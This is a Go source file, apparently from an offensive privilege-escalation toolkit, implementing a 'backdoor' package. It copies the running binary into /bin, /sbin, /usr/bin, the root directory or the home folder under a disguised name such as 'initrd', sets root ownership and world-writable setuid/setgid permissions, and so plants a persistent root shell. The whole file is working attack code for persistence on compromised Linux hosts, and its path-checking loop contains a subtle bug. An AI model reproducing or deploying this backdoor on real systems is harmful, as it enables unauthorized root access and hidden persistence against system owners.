package backdoor

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"syscall"

	"github.com/liamg/traitor/pkg/random"

	"golang.org/x/sys/unix"
)

type Metadata struct {
	Path string
}

var backdoorDirs = []string{
	"/bin",
	"/sbin",
	"/usr/bin",
	"/",
}

var backdoorFilenames = []string{
	"initrd",
}

func findWritableDirectory() (string, error) {

	var candidates []string

	candidates = append(candidates, backdoorDirs...)

	if targetDir, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates, targetDir)
	}

	for _, candidate := range candidates {
		if err := syscall.Access(candidate, unix.W_OK); err != nil {
			continue
		}
		return candidate, nil
	}

	return "", fmt.Errorf("no writable directory found")
}

func Uninstall(path string) error {
	return os.Remove(path)
}

func Install() (*string, error) {

	targetDir, err := findWritableDirectory()
	if err != nil {
		return nil, err
	}

	var candidates []string
	candidates = append(candidates, backdoorFilenames...)
	for i := 0; i < 10; i++ {
		candidates = append(candidates, random.Filename())
	}
	var path string
	for _, name := range candidates {
		testPath := filepath.Join(targetDir, name)
		if _, err := os.Stat(path); os.IsNotExist(err) {
			path = testPath
			break
		}
	}

	if path == "" {
		return nil, fmt.Errorf("failed to find writable path")
	}

	return InstallToPath(path)
}

func InstallToPath(path string) (*string, error) {

	if _, err := os.Stat(path); !os.IsNotExist(err) {
		if err != nil {
			return nil, err
		}
		return nil, fmt.Errorf("file already exists")
	}

	file, err := os.Create(path)
	if err != nil {
		return nil, err
	}

	setuidShellSrcPath, err := os.Executable()
	if err != nil {
		return nil, err
	}

	input, err := ioutil.ReadFile(setuidShellSrcPath)
	if err != nil {
		return nil, err
	}

	if _, err := file.Write(input); err != nil {
		return nil, err
	}
	if err := file.Close(); err != nil {
		return nil, err
	}

	if err := os.Chown(path, 0, 0); err != nil {
		return nil, err
	}

	if err := os.Chmod(path, 0777|os.ModeSetuid|os.ModeSetgid); err != nil {
		return nil, err
	}

	return &path, nil
}
